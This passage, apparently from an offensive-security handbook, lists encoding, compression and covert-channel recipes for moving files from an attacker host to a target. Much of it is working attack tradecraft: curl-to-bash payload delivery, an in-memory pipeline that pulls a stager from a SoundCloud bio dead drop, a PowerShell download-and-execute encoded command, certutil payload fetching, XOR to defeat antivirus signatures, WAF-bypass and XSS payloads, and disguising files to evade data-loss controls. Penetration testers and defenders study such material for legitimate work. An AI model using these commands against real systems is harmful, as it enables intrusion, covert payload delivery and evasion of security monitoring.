tar czf out.tar.gz dir/
tar xzf out.tar.gz

# + xz
tar cJf out.tar.xz dir/
tar xJf out.tar.xz
```

**Download from server + unpack:**
```bash
curl -s http://$LHOST/out.tar.gz | tar xz
```

### Windows

Windows 10 1803+ ships `bsdtar`:

```cmd
tar -czf out.tar.gz dir\
tar -xzf out.tar.gz
tar -cJf out.tar.xz dir\
tar -xJf out.tar.xz
```

---

## ZIP

Flags: `-r` - recursive; `-e` - prompt for a password; `-P PASS` - password in argv (visible in `ps`); `unzip -d DIR` - where to extract.

### Linux

```bash
zip -r out.zip dir/
unzip out.zip

# with a password (weak ZipCrypto)
zip -r -e out.zip dir/
```

**Download from server + unpack:**
```bash
curl -s http://$LHOST/out.zip -o out.zip && unzip out.zip
```

### Windows

**Encode / Decode - PowerShell 5+:**
```powershell
Compress-Archive -Path C:\Users\Public\secrets\* -DestinationPath out.zip
Expand-Archive -Path out.zip -DestinationPath C:\Users\Public\extracted
```

**Download from server + unpack - PowerShell:**
```powershell
iwr "http://${LHOST}/out.zip" -OutFile out.zip
Expand-Archive -Path out.zip -DestinationPath C:\Users\Public\extracted
```

---

## 7z

Flags: `a` - add, `x` - extract; `-pPASS` - password; `-mhe=on` - encrypt headers/names; `-mx=9` - maximum.

Best compression + header encryption (`-mhe=on` also hides the file names).

### Linux

```bash
apt install p7zip-full

# pack
7z a out.7z file.bin

# with a password and filename encryption
7z a -p'P@ss' -mhe=on out.7z dir/

# unpack
7z x out.7z
```

**Download from server + unpack:**
```bash
curl -s http://$LHOST/out.7z -o out.7z && 7z x out.7z
```

### Windows

```cmd
7z a out.7z file.bin
7z a -pP@ss -mhe=on out.7z dir\
7z x out.7z
```

---

## zstd (Zstandard)

Flags: `-19` - maximum; `-d` - decompress; `-c` - stdout; `-T0` - all cores; `-o` - output file.

The modern balance: compresses better than gzip, decompresses faster than xz. Supported in `tar`/`7z`.

### Linux

```bash
apt install zstd
zstd -19 file.bin -o file.bin.zst      # -19 = maximum
unzstd file.bin.zst                    # or: zstd -d file.bin.zst -o file.bin
```

**Download from server + decompress:**
```bash
curl -s http://$LHOST/file.bin.zst | zstd -d > file.bin
```

**tar + zstd:**
```bash
tar --zstd -cf out.tar.zst dir/
tar --zstd -xf out.tar.zst
```

### Windows

```cmd
zstd -19 file.bin -o file.bin.zst
zstd -d file.bin.zst -o file.bin
tar --zstd -cf out.tar.zst dir\
tar --zstd -xf out.tar.zst
```

---

## lz4

Flags: `-9` - maximum; `-d` - decompress; `-c` - stdout.

Very fast, compresses less. For large volumes and fast links.

### Linux

```bash
apt install lz4
lz4 file.bin file.bin.lz4              # compress
unlz4 file.bin.lz4                     # or: lz4 -d file.bin.lz4
```

**Download from server + decompress:**
```bash
curl -s http://$LHOST/file.bin.lz4 | lz4 -d > file.bin
```

### Windows

Via `7z` (Modern7z) or Python:
```powershell
python -c "import lz4.frame;open('file.bin.lz4','wb').write(lz4.frame.compress(open('file.bin','rb').read()))"
python -c "import lz4.frame;open('file.bin','wb').write(lz4.frame.decompress(open('file.bin.lz4','rb').read()))"
```

---

## brotli

Flags: `-q 11` - maximum quality; `-d` - decompress; `-o` - output file; `-c` - stdout.

Compresses text/web well (`.br` format). There's a CLI and a Python module.

### Linux

```bash
apt install brotli
brotli -q 11 -o file.bin.br file.bin
brotli -d -o file.bin file.bin.br
```

**Download from server + decompress:**
```bash
curl -s http://$LHOST/file.bin.br | brotli -d > file.bin
```

### Windows

Through Python:
```powershell
python -c "import brotli;open('file.bin.br','wb').write(brotli.compress(open('file.bin','rb').read(),quality=11))"
python -c "import brotli;open('file.bin','wb').write(brotli.decompress(open('file.bin.br','rb').read()))"
```

---

## lzip / lrzip / lzop

Flags: `-9` - maximum; `-d` - decompress; `-c` - stdout.

Relatives of LZMA/LZO - for distributions and embedded systems.

### Linux

```bash
# lzip (LZMA, .lz)
apt install lzip
lzip -9 file.bin                       # -> file.bin.lz
lzip -d file.bin.lz

# lrzip (.lrz)
apt install lrzip
lrzip file.bin                         # -> file.bin.lrz
lrzip -d file.bin.lrz

# lzop (.lzo)
apt install lzop
lzop file.bin                          # -> file.bin.lzo
lzop -d file.bin.lzo
```

**Download from server + decompress:**
```bash
curl -s http://$LHOST/file.bin.lz  | lzip -d > file.bin
curl -s http://$LHOST/file.bin.lrz | lrzip -d > file.bin
curl -s http://$LHOST/file.bin.lzo | lzop -d > file.bin
```

### Windows

Natively rare - `7z` (partially), WSL or the Python modules `lzma` / `lzo`.

---

## compress (.Z) / bzip3 / snappy

Flags: `-k` - keep the source (bzip3); `-d` - decompress; `-c` - stdout (snzip/bzip3).

### Linux

```bash
# compress (.Z) - ncompress
apt install ncompress
compress file.bin                      # -> file.bin.Z
uncompress file.bin.Z

# bzip3 (.bz3) - a modern BWT compressor
apt install bzip3
bzip3 -k file.bin                      # -> file.bin.bz3
bzip3 -d file.bin.bz3

# snappy - via snzip
apt install snzip
snzip file.bin                         # -> file.bin.sz
snzip -d file.bin.sz
```

**Download from server + decompress:**
```bash
curl -s http://$LHOST/file.bin.Z   | uncompress > file.bin
curl -s http://$LHOST/file.bin.bz3 | bzip3 -d > file.bin
curl -s http://$LHOST/file.bin.sz  | snzip -d > file.bin
```

### Windows

`compress`/`bzip3`/`snappy` are natively rare - `7z`, WSL or Python (`bz3`, `python-snappy`).

---

## RAR

Flags: `a` - add, `x` - extract; `-hpPASS` - password + header encryption; `-pPASS` - data only; `-m5` - maximum compression.

Proprietary, but still common for large archives. Header encryption with `-hp`.

### Linux

```bash
apt install rar unrar
rar a out.rar file.bin
rar a -hp'P@ss' out.rar dir/           # -hp = encrypt both the data and the headers
unrar x out.rar
```

**Download from server + unpack:**
```bash
curl -s http://$LHOST/out.rar -o out.rar && unrar x out.rar
```

### Windows

```cmd
rar a out.rar file.bin
rar a -hpP@ss out.rar dir\
unrar x out.rar
```

---

## CAB / cpio / ar (rare archives)

Flags: `cabextract FILE` - extract; `cpio -o -H newc` - create an archive; `cpio -idmv` - extract; `ar rcs` - create/add; `ar x` - extract.

### Linux

```bash
# CAB (Microsoft Cabinet) - extraction
apt install cabextract
cabextract file.cab

# cpio (initramfs, RPM)
find dir/ | cpio -o -H newc > out.cpio
cpio -idmv < out.cpio

# ar (deb, static libraries)
ar rcs out.a file.o
ar x out.a
```

### Windows

```cmd
:: CAB is extracted by the built-in expand.exe
expand file.cab -F:* C:\Users\Public\extracted
```

---

# Part 3. Web / MIME / text escaping

Not "binary -> text", but transforming **strings** - for payloads, filter bypass, and web/mail formats.

## URL-encoding (percent-encoding)

Flags: `quote(..., safe='')` - encode everything, including `/`; `unquote` - decode; `jq -sRr @uri` - the same via jq.

`%XX` encoding for URLs/HTTP. Needed for SSRF, open redirects, WAF bypass.

### Linux

```bash
# encode (everything except letters/digits)
python3 -c "import urllib.parse,sys; sys.stdout.write(urllib.parse.quote(sys.stdin.read(), safe=''))" < in.txt > out.txt
# decode
python3 -c "import urllib.parse,sys; sys.stdout.write(urllib.parse.unquote(sys.stdin.read()))" < out.txt > in.txt

# encode via jq (if installed)
jq -sRr @uri < in.txt > out.txt
```

**Download from server + decode:**
```bash
curl -s http://$LHOST/file.uri | python3 -c "import sys,urllib.parse; sys.stdout.write(urllib.parse.unquote(sys.stdin.read()))" > file.txt
```

### Windows

```powershell
[uri]::EscapeDataString("a b/c?d=e")               # encode
[uri]::UnescapeDataString("a%20b%2Fc%3Fd%3De")     # decode
```

---

## HTML entities

Flags: `html.escape` - encode; `html.unescape` - decode; PowerShell - `HtmlEncode`/`HtmlDecode`.

`&lt; &gt; &amp; &#x41;` - for XSS/injections and HTML parsing.

### Linux

```bash
python3 -c "import html,sys; sys.stdout.write(html.escape(sys.stdin.read()))" < in.txt > out.txt
python3 -c "import html,sys; sys.stdout.write(html.unescape(sys.stdin.read()))" < out.txt > in.txt
```

**Download from server + decode:**
```bash
curl -s http://$LHOST/file.html | python3 -c "import sys,html; sys.stdout.write(html.unescape(sys.stdin.read()))" > file.txt
```

### Windows

```powershell
[System.Net.WebUtility]::HtmlEncode("<script>")
[System.Net.WebUtility]::HtmlDecode("&lt;script&gt;")
```

---

## Quoted-printable

Flags: `quopri.encode(..., 1)` - the third argument encodes tabs/spaces; `quopri.decode` - back; Perl `-MMIME::QuotedPrint -0777` reads the whole file.

`=XX` escaping from MIME/e-mail (RFC 2045). Useful when parsing mail.

### Linux

```bash
# encode
python3 -c "import quopri,sys; quopri.encode(sys.stdin.buffer, sys.stdout.buffer, 1)" < file.bin > file.qp
# decode
python3 -c "import quopri,sys; quopri.decode(sys.stdin.buffer, sys.stdout.buffer)" < file.qp > file.bin

# Perl alternative
perl -MMIME::QuotedPrint -0777 -ne 'print decode_qp($_)' < file.qp > file.bin
```

**Download from server + decode:**
```bash
curl -s http://$LHOST/file.qp | python3 -c "import quopri,sys; quopri.decode(sys.stdin.buffer, sys.stdout.buffer)" > file.bin
```

### Windows

Through Python (same commands, `python` instead of `python3`).

---

## Punycode / IDN

Flags: `idn2` - Unicode -> Punycode; `-d` - Punycode -> Unicode.

`xn--...` - Unicode domain encoding. Needed for phishing, host-check bypass, SSRF.

### Linux

```bash
apt install idn2
idn2 пример.рф              # -> xn--e1afmkfd.xn--p1ai
idn2 -d xn--e1afmkfd.xn--p1ai
```

**Python:**
```bash
python3 -c "print('пример'.encode('idna').decode())"          # -> xn--e1afmkfd
python3 -c "print('xn--e1afmkfd'.encode().decode('idna'))"
```

### Windows

```powershell
$idn = New-Object System.Globalization.IdnMapping
$idn.GetAscii("пример.рф")
$idn.GetUnicode("xn--e1afmkfd.xn--p1ai")
```

---

## Unicode escaping (`\uXXXX`, `\xNN`, UTF-7)

Flags: `unicode_escape` - `\uXXXX`/`\xNN`; `utf-7` - UTF-7; `sed 's/\\x//g' | xxd -r -p` - hex -> binary.

For payloads and filter bypass: `\u003c` = `<`, `\x3c` = `<`. UTF-7 historically broke XSS filters.

### Linux

```bash
# \uXXXX (and \xNN) - decode
python3 -c "import sys; sys.stdout.write(sys.stdin.read().encode().decode('unicode_escape'))" < in.txt > out.txt
# \uXXXX - encode
python3 -c "print(open('in.txt').read().encode('unicode_escape').decode())" > out.txt

# \xNN - decode via sed + xxd
sed 's/\\x//g; s/ //g' in.txt | xxd -r -p > out.bin

# UTF-7
python3 -c "print('<script>alert(1)</script>'.encode('utf-7').decode())"
python3 -c "print('+ADw-script+AD4-alert(1)+ADw-/script+AD4-'.encode().decode('utf-7'))"
```

### Windows

```powershell
# \uXXXX -> characters
'\u003cscript\u003e' -replace '\\u([0-9a-fA-F]{4})', { [char][Convert]::ToInt32($_.Groups[1].Value,16) }
# UTF-7
[Text.Encoding]::UTF7.GetString([Text.Encoding]::UTF7.GetBytes("<script>"))
```

---

## PGP / MIME ASCII armor

Flags: `gpg --enarmor` - binary -> ASCII armor; `--dearmor` - back; `openssl base64 -in/-out` - encoding only, no encryption.

Wraps a binary in `-----BEGIN PGP MESSAGE-----` - looks "legitimate" and slips through text channels.

### Linux

```bash
# PGP armor
gpg --enarmor < file.bin > file.asc
gpg --dearmor < file.asc > file.bin

# MIME/base64 with headers (uuencode -m)
uuencode -m file.bin file.bin > file.mime

# PEM via openssl (base64 + header)
openssl base64 -in file.bin -out file.pem
```

**Download from server + dearmor:**
```bash
curl -s http://$LHOST/file.asc | gpg --dearmor > file.bin
```

### Windows

```cmd
gpg --enarmor < file.bin > file.asc
gpg --dearmor < file.asc > file.bin
:: base64-PEM via certutil
certutil -decode file.pem file.bin
```

---

# Part 4. Classics and covert channels

## Atbash / Caesar (classical substitutions)

### Linux

```bash
# Atbash (A<->Z, a<->z)
echo "Attack at dawn" | tr 'A-Za-z' 'Z-Az-a'

# Caesar +3 (encode)
echo "Attack at dawn" | tr 'A-Za-z' 'D-ZA-Cd-za-c'
# Caesar +3 (decode)
echo "Dwwdfn dw gdzq" | tr 'D-ZA-Cd-za-c' 'A-Za-z'
```

### Windows

```powershell
$map = "ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba"
$out = -join ((Get-Content -Raw in.txt).ToCharArray() | ForEach-Object {
  if     ($_ -cmatch '[A-Z]') { $map[[int][char]$_ - 65] }
  elseif ($_ -cmatch '[a-z]') { $map[[int][char]$_ - 97 + 26] }
  else                        { $_ }
})
[IO.File]::WriteAllText("out.txt", $out)
```

---

## Morse / A1Z26 / Binary / Decimal

Numeric and "human" representations - for CTF and for channels where ordinary characters can't be passed.

### Linux

```bash
# A1Z26 (A=1..Z=26)
python3 -c "print(' '.join(str(ord(c.upper())-64) for c in 'HELLO'))"
python3 -c "print(''.join(chr(int(x)+64) for x in '8 5 12 12 15'.split()))"

# Binary (0/1)
python3 -c "print(' '.join(format(b,'08b') for b in open('file.bin','rb').read()))" > file.bin
python3 -c "import sys; sys.stdout.buffer.write(bytes(int(x,2) for x in sys.stdin.read().split()))" < file.bin > out.bin

# Decimal (bytes as numbers)
python3 -c "print(' '.join(str(b) for b in open('file.bin','rb').read()))" > file.dec
python3 -c "import sys; sys.stdout.buffer.write(bytes(int(x) for x in sys.stdin.read().split()))" < file.dec > file.bin

# Morse
pip install morse-talk
python3 -c "import morse_talk as mtalk; print(mtalk.encode('SOS'))"
python3 -c "import morse_talk as mtalk; print(mtalk.decode('... --- ...'))"
```

### Windows

Through Python (same commands, `python` instead of `python3`).

---

## Zero-width / Unicode steganography

Hides data with **invisible** characters (U+200B ZWSP, U+200C ZWNJ, U+200D ZWJ, U+FEFF) inside ordinary text - an ideal channel for bios/comments/chats.

### Linux

**Encode (hide `file.bin` in `cover.txt` -> `stego.txt`):**
```bash
python3 - <<'PY'
data = open('file.bin','rb').read()
bits = ''.join(f'{b:08b}' for b in data)
zw = {'0':'\u200b', '1':'\u200c'}          # ZWSP / ZWNJ
cover = open('cover.txt', encoding='utf-8').read()
open('stego.txt','w', encoding='utf-8').write(cover + ''.join(zw[b] for b in bits))
PY
```

**Decode:**
```bash
python3 - <<'PY'
t = open('stego.txt', encoding='utf-8').read()
bits = ''.join('0' if c == '\u200b' else '1' for c in t if c in '\u200b\u200c')
open('file.bin','wb').write(bytes(int(bits[i:i+8],2) for i in range(0, len(bits)-7, 8)))
PY
```

**Find/strip invisible characters:**
```bash
grep -oP '[\x{200b}\x{200c}\x{200d}\x{feff}]' stego.txt | wc -l
sed 's/[\x{200b}\x{200c}\x{200d}\x{feff}]//g' stego.txt > clean.txt
```

### Windows

Through Python (same scripts, `python` instead of `python3`). Ready-made library: `pip install zwsp-steg-py`.

---

## QR code as a channel

Flags: `qrencode -o FILE` - output image; `zbarimg -q` - no service output; `--raw` - QR data only.

Binary -> base64 -> QR; handy for transfer through a screen/camera or "printing it on paper".

### Linux

```bash
apt install qrencode zbar-tools
# file -> base64 -> QR image
base64 -w0 file.bin | qrencode -o qr.png
# QR -> data
zbarimg -q --raw qr.png | base64 -d > file.bin
```

> A large file won't fit in one QR - split the base64 into chunks and generate a series (`split -b 2000`) or use multi-QR (`paperkey`, `qrencode -S`).

### Windows

```powershell
pip install qrcode pillow pyzbar
python -c "import base64,qrcode;qrcode.make(base64.b64encode(open('file.bin','rb').read())).save('qr.png')"
python -c "from pyzbar.pyzbar import decode;from PIL import Image;import base64;open('file.bin','wb').write(base64.b64decode(decode(Image.open('qr.png'))[0].data))"
```

---

## Full set: `linenum.sh` in every encoding

One consolidated recipe: on LHOST we generate the file in every encoding, on RHOST we fetch it over HTTP and decode it on the fly.

```bash
# ============================================================
# LHOST - generate every encoding from linenum.sh
# ============================================================

# to execute in memory (drop the filename and >)
curl -s http://$LHOST/linenum.hex | xxd -r -p | sh

# base64
base64 -w0 linenum.sh > linenum.b64
#RHOST
curl -s http://$LHOST/linenum.b64 | base64 -d > linenum.sh

# base32
base32 -w0 linenum.sh > linenum.b32
#RHOST
curl -s http://$LHOST/linenum.b32 | base32 -d > linenum.sh

# hex
xxd -p linenum.sh | tr -d '\n' > linenum.hex
#RHOST
curl -s http://$LHOST/linenum.hex | xxd -r -p > linenum.sh

# gzip
gzip -9 -c linenum.sh > linenum.gz
#RHOST
curl -s http://$LHOST/linenum.gz | gunzip > linenum.sh

# bzip2
bzip2 -9 -c linenum.sh > linenum.bz2
#RHOST
curl -s http://$LHOST/linenum.bz2 | bunzip2 > linenum.sh

# xz
xz -9 -c linenum.sh > linenum.xz
#RHOST
curl -s http://$LHOST/linenum.xz | xz -dc > linenum.sh

# zlib
python3 -c "import zlib;open('linenum.zlib','wb').write(zlib.compress(open('linenum.sh','rb').read(),9))"
#RHOST
curl -s http://$LHOST/linenum.zlib | python3 -c "import sys,zlib;sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read()))" > linenum.sh

# AES-256-CBC (password: transfer)
openssl enc -aes-256-cbc -pbkdf2 -base64 -k transfer -in linenum.sh > linenum.enc
#RHOST
curl -s http://$LHOST/linenum.enc | openssl enc -d -aes-256-cbc -pbkdf2 -base64 -k transfer > linenum.sh

# base85 (Ascii85)
python3 -c "import base64;open('linenum.b85','wb').write(base64.b85encode(open('linenum.sh','rb').read()))"
#RHOST
curl -s http://$LHOST/linenum.b85 | python3 -c "import sys,base64;sys.stdout.buffer.write(base64.b85decode(sys.stdin.buffer.read()))" > linenum.sh

# z85
basenc --z85 < linenum.sh > linenum.z85
#RHOST
curl -s http://$LHOST/linenum.z85 | basenc --z85 -d > linenum.sh

# UTF-16LE
iconv -f UTF-8 -t UTF-16LE linenum.sh > linenum.utf16
#RHOST
curl -s http://$LHOST/linenum.utf16 | iconv -f UTF-16LE -t UTF-8 > linenum.sh

# uuencode
uuencode linenum.sh linenum.sh > linenum.uu
#RHOST
curl -s http://$LHOST/linenum.uu > /tmp/l.uu && uudecode -o linenum.sh /tmp/l.uu

# XOR 0x42 -> base64
python3 -c "import base64;open('linenum.xor42.b64','wb').write(base64.b64encode(bytes(b^0x42 for b in open('linenum.sh','rb').read())))"
#RHOST
curl -s http://$LHOST/linenum.xor42.b64 | python3 -c "import sys,base64;sys.stdout.buffer.write(bytes(b^0x42 for b in base64.b64decode(sys.stdin.buffer.read())))" > linenum.sh

# XOR 0x5A (raw)
python3 -c "open('linenum.xor5a','wb').write(bytes(b^0x5A for b in open('linenum.sh','rb').read()))"
#RHOST
curl -s http://$LHOST/linenum.xor5a | python3 -c "import sys;sys.stdout.buffer.write(bytes(b^0x5A for b in sys.stdin.buffer.read()))" > linenum.sh

# three layers: base64url -> base16 -> base32
basenc --base64url < linenum.sh | basenc --base16 | basenc --base32 > linenum.x3
#RHOST
curl -s http://$LHOST/linenum.x3 | basenc --base32 -d | basenc --base16 -d | basenc --base64url -d > linenum.sh

# octal (\NNN)
od -An -to1 -v linenum.sh | tr -s ' ' '\' | sed 's/\\$//' > linenum.oct
#RHOST
curl -s http://$LHOST/linenum.oct > /tmp/l.oct && printf "$(cat /tmp/l.oct)" > linenum.sh

# sha256 (integrity check)
sha256sum linenum.sh > linenum.sh.sha256
#RHOST
curl -s http://$LHOST/linenum.sh.sha256 -o linenum.sh.sha256 && sha256sum -c linenum.sh.sha256

# tar.gz (nc | tar)
tar czf linenum.tar.gz linenum.sh
#RHOST
curl -s http://$LHOST/linenum.tar.gz | tar xz
```

---

## SOUNDCLOUD - payload delivery via a public BIO field

> **Authorized labs only.** This technique abuses a third-party service and violates its Terms of Service. Use an account **you own**; never publish payloads on someone else's profile. The marker below identifies your payload - it is not a security control and does not make the channel legitimate.

Flags: `curl -s` - silent; `-H` - header; `--compressed` - let curl negotiate and decompress gzip/deflate/br; `grep -oE` - matches only; `sed` - strip the JSON wrapper and the marker.

The idea: use the public `bio` text field on SoundCloud as a dead drop for a **small stager**. A bio is limited to ~4,000 characters, which is roughly 3 KB of base64 and about 2-3 KB of xz-compressed data. That is enough for a short shell/PowerShell stager - `linenum.sh` does **not** fit. For a real toolkit, put only a download URL in the bio (or use another channel).

The profile HTML contains many `"description"` fields (tracks, playlists, and so on). A unique marker at the start of the bio is what makes extraction deterministic: `grep` must match the marker, not just any description.

1. Compress the stager with `xz`.
2. Prefix a unique marker (letters/digits, e.g. `AEZAKMI`) and base64-encode the compressed bytes. Base64 adds ~33%, but the result is still small for a stager.
3. Paste marker + base64 into the bio of your own profile.
4. On RHOST, fetch the profile, select the description that starts with the marker, strip the wrapper and the marker, then decode.

**Build the bio string (LHOST):**
```bash
MARKER='AEZAKMI'
{ printf '%s' "$MARKER"; xz -9 < stager.sh | base64 -w0; } > bio.txt
cat bio.txt        # paste this into your own SoundCloud bio
```

**Extract only (no execution) - note the marker inside `grep`:**
```bash
MARKER='AEZAKMI'
curl -s "https://soundcloud.com/YOUR_PROFILE" \
  -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0" \
  --compressed \
  | grep -oE '"description":"'"$MARKER"'[^"]*"' \
  | head -1 \
  | sed 's/^"description":"//; s/"$//' \
  | sed "s/^$MARKER//" > payload.b64
base64 -d payload.b64 | xz -d > stager.sh
```

**Full pipeline - fetch, unpack and execute without writing to disk:**
```bash
MARKER='AEZAKMI'
curl -s "https://soundcloud.com/YOUR_PROFILE" \
  -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0" \
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
  -H "Accept-Language: en-US,en;q=0.5" \
  -H "Sec-Fetch-Dest: document" \
  -H "Sec-Fetch-Mode: navigate" \
  -H "Sec-Fetch-Site: none" \
  --compressed \
  | grep -oE '"description":"'"$MARKER"'[^"]*"' \
  | head -1 \
  | sed 's/^"description":"//; s/"$//' \
  | sed "s/^$MARKER//" \
  | tr -d '\n\r ' \
  | base64 -d \
  | xz -d \
  | bash
```

> `grep` selects the field **by marker**; `sed` only removes the JSON wrapper and the marker afterwards. Without the marker in `grep`, `head -1` would pick an arbitrary description field and the pipeline would fail or execute garbage. Use a unique marker per payload and keep it to letters/digits so it is safe in both `grep` and `sed`.
>
> `--compressed` lets curl advertise only the encodings it was built with. Do not hardcode `Accept-Encoding: br` unless your curl supports Brotli, or you will get an "unrecognized content encoding" error.
>
> To IDS/IPS this still looks like ordinary HTTPS traffic to `soundcloud.com`. That is the point of a trusted-site dead drop - and also why it is fragile: the profile page, its HTML and the bio limit can change at any time.

---

## Interesting combinations

Ready-made matryoshkas built from compression, encoding and obfuscation. The logic is always the same: **compress -> encode -> transmit -> decode -> decompress**. Compression reduces size and incidentally breaks signatures, encoding turns the data into text, XOR/encryption hides the content.

> **Ordering rule:** on the receiving end, layers are removed **in reverse order**. Encrypted last - decrypt first; encoded last - decode first.

### xz + base64 (maximum compression into text)

The best size for large files, and it passes text channels without trouble.

```bash
# LHOST - pack
xz -9 < file.bin | base64 -w0 > file.txt

# RHOST - unpack to a file
base64 -d file.txt | xz -d > file.bin

# RHOST - execute without writing to disk
curl -s http://$LHOST/file.txt | base64 -d | xz -d | bash
```

### gzip + base64 (the universal minimum)

`gzip` is everywhere, including Windows/PowerShell scenarios.

```bash
# LHOST
gzip -9 -c file.bin | base64 -w0 > file.txt
# RHOST
base64 -d file.txt | gunzip > file.bin
```

### zstd + base64 (fast and compact)

The compromise between `gzip` and `xz` on speed/size.

```bash
# LHOST
zstd -19 -c file.bin | base64 -w0 > file.txt
# RHOST
base64 -d file.txt | zstd -d > file.bin
```

### tar + xz + base64 (a whole folder in one line)

Exfiltrating a directory as a single text blob.

```bash
# LHOST - pack the directory
tar cJf - dir/ | base64 -w0 > loot.txt
# RHOST - unpack
base64 -d loot.txt | tar xJf -
```

### XOR + base64 (strip the signature/heuristics)

XOR removes recognizable strings (`MZ`, AV signatures), base64 turns it back into text.

```bash
# LHOST - XOR 0x42 + base64
python3 -c "import base64;open('x.b64','wb').write(base64.b64encode(bytes(b^0x42 for b in open('file.bin','rb').read())))"
# RHOST - base64 -d + XOR
python3 -c "import base64;open('file.bin','wb').write(bytes(b^0x42 for b in base64.b64decode(open('x.b64','rb').read())))"
```

### gzip + XOR + base64 (compression + obfuscation)

Compress first, then obfuscate, then encode.

```bash
# LHOST
python3 -c "import gzip,base64;open('x.b64','wb').write(base64.b64encode(bytes(b^0x5A for b in gzip.compress(open('file.bin','rb').read(),9))))"
# RHOST
python3 -c "import gzip,base64;open('file.bin','wb').write(gzip.decompress(bytes(b^0x5A for b in base64.b64decode(open('x.b64','rb').read()))))"
```

### AES + base64 (encryption in a text channel)

The content can't be read even if the channel is opened. More in [11 - Encryption](11-encryption.md).

```bash
# LHOST - encrypt and encode
openssl enc -aes-256-cbc -pbkdf2 -base64 -k 'transfer' -in file.bin -out file.enc
# RHOST - decode and decrypt
openssl enc -d -aes-256-cbc -pbkdf2 -base64 -k 'transfer' -in file.enc -out file.bin
```

Flags: `-aes-256-cbc` - cipher; `-pbkdf2` - KDF; `-base64` - ASCII armor; `-k` - password in argv (prefer `-pass env:PASS`); `-d` - decrypt; `-in`/`-out` - files.

### Double base64 (bypass filters that decode one layer)

Simple WAFs/scanners strip one base64 layer - the second one survives.

```bash
# LHOST
base64 -w0 file.bin | base64 -w0 > file.b64x2
# RHOST
base64 -d file.b64x2 | base64 -d > file.bin
```

### base64url + JSON (binary in a JSON field)

Push a file inside an ordinary JSON request/field.

```bash
# LHOST - value for JSON
python3 -c "import base64,json;print(json.dumps({'d':base64.urlsafe_b64encode(open('file.bin','rb').read()).decode()}))" > payload.json
# RHOST - extract and decode
python3 -c "import json,base64;open('file.bin','wb').write(base64.urlsafe_b64decode(json.load(open('payload.json'))['d']))"
```

### PowerShell -EncodedCommand (UTF-16LE + base64, no file)

Execution on Windows without dropping a file on disk; the argument looks like ordinary base64.

```bash
# LHOST - build the -EncodedCommand
CMD='IEX(New-Object Net.WebClient).DownloadString("http://LHOST/s.ps1")'
echo -n "$CMD" | iconv -t UTF-16LE | base64 -w0
# RHOST (Windows)
powershell -NoProfile -EncodedCommand <STRING>
```

### certutil round-trip (LOLBin on Windows)

A built-in tool: nothing has to be delivered in order to decode.

```cmd
:: RHOST (Windows) - download and decode without third-party tools
certutil -urlcache -f http://LHOST/file.b64 file.b64
certutil -decode file.b64 payload.exe
```

### URL-encode + HTML entities (bypass XSS/WAF filters)

Different parsers unwrap different layers - whatever one of them misses still reaches the next one.

```bash
# LHOST - payload -> HTML entities -> URL-encode
echo -n '<img src=x onerror=alert(1)>' | python3 -c "import html,urllib.parse,sys;sys.stdout.write(urllib.parse.quote(html.escape(sys.stdin.read()),safe=''))"
```

### Double URL-encoding (bypass a WAF that decodes once)

The WAF decodes once, the application decodes again.

```bash
# LHOST
python3 -c "import urllib.parse as u;print(u.quote(u.quote('/etc/passwd')))"
# -> %252Fetc%252Fpasswd
```

### UTF-7 / Unicode escapes (bypass web filters)

For XSS contexts that don't expect non-ASCII, and for JSON/JS.

```bash
# UTF-7
python3 -c "print('<script>alert(1)</script>'.encode('utf-7').decode())"
# \uXXXX
python3 -c "print('<script>'.encode('unicode_escape').decode())"
```

### base32 (case-insensitive/voice channel)

Only `A-Z2-7` - survives case changes, manual entry and dictation.

```bash
# LHOST
base32 -w0 file.bin > file.b32
# RHOST
base32 -d file.b32 > file.bin
```

### Base2048 + social network (binary via tweet/chat)

Fit a payload into a post's character limit.

```bash
# LHOST
python3 -c "import base2048,sys;sys.stdout.write(base2048.encode(open('file.bin','rb').read()))" > post.txt
# RHOST
python3 -c "import base2048;open('file.bin','wb').write(base2048.decode(open('post.txt',encoding='utf-8').read().strip()))"
```

### Zero-width + cover text (invisible channel in a bio/comment)

The text looks harmless, the data sits in invisible characters. A ready-made script is in the [Zero-width / Unicode steganography](13-stegano.md#73-unicode-steganography-zero-width-homoglyphs-emoji) section.

### QR + base64 + xz (offline channel: screen -> camera)

Transfer without a network: show a QR - scan it with a camera.

```bash
# LHOST - compress, encode and output a QR
xz -9 < file.bin | base64 -w0 | qrencode -o qr.png
# RHOST - scan the QR and unpack
zbarimg -q --raw qr.png | base64 -d | xz -d > file.bin
```

### split + base64 + cat (bypass a field length limit)

We drop the long base64 string into length-limited fields in chunks.

```bash
# LHOST - cut into parts
base64 -w0 file.bin | split -b 2000 - part_
# RHOST - reassemble
cat part_* | tr -d '\n' | base64 -d > file.bin
```

### Extension/MIME disguise

DLP often filters by extension - so we serve base64 under a harmless name.

```bash
# LHOST - serve it as an "image"
cp file.b64 update.jpg && python3 -m http.server 80
# RHOST
curl -s http://$LHOST/update.jpg | base64 -d > file.bin
```

### xz + XOR + base64 (deep matryoshka)

The more layers, the lower a signature scanner's chances; remove them strictly in reverse order.

```bash
# LHOST: file -> xz -> XOR -> base64
python3 -c "import lzma,base64;open('x.txt','wb').write(base64.b64encode(bytes(b^0x5A for b in lzma.compress(open('file.bin','rb').read(),preset=9))))"
# RHOST: base64 -> XOR -> xz -> file
python3 -c "import lzma,base64;open('file.bin','wb').write(lzma.decompress(bytes(b^0x5A for b in base64.b64decode(open('x.txt','rb').read()))))"
```

### Live pipeline (execution without writing to disk)

Minimal disk footprint, and IDS sees a single HTTP request.

```bash
curl -s http://$LHOST/linenum.xz.b64 | base64 -d | xz -d | bash
```

---

## Variable forms

**Linux (bash)**
```bash
export LHOST=192.168.2.5
export RHOST=192.168.10.20
# usage: $LHOST
```

**Windows (CMD)**
```cmd
set LHOST=192.168.2.5
set RHOST=192.168.10.20
:: usage: %LHOST%
```

**Windows (PowerShell)**
```powershell
$LHOST = "192.168.2.5"
$RHOST = "192.168.10.20"
# usage: $LHOST
```

More on this - [README](../../README.md).

---

[← Back to the handbook](../../README.md)
